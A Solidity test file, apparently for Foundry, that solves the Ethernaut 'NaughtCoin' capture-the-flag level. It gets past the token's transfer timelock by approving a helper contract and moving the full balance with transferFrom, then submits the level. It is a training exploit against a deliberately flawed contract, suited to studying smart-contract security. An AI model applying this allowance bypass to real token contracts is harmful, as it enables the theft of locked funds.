pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../NaughtCoin/NaughtCoinFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract NaughtCoinTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    event balance(uint256);

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testNaughtCoinHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
        ethernaut.registerLevel(naughtCoinFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(naughtCoinFactory);
        NaughtCoin ethernautNaughtCoin = NaughtCoin(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        uint256 myBalance = ethernautNaughtCoin.balanceOf(tx.origin);

        NaughtCoinHolder holder = new NaughtCoinHolder(ethernautNaughtCoin);

        ethernautNaughtCoin.approve(address(holder), myBalance);
        holder.transferFrom(tx.origin, address(holder), myBalance);

        ethernautNaughtCoin.balanceOf(tx.origin);
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract NaughtCoinHolder {
    NaughtCoin public naughtCoin;

    constructor(NaughtCoin _naughtCoin) {
        naughtCoin = _naughtCoin;
    }

    function transfer(address to, uint256 amount) public {
        naughtCoin.transfer(to, amount);
    }

    function balanceOf(address account) public view returns (uint256) {
        return naughtCoin.balanceOf(account);
    }

    function approve(address spender, uint256 amount) public {
        naughtCoin.approve(spender, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public {
        naughtCoin.transferFrom(from, to, amount);
    }
}
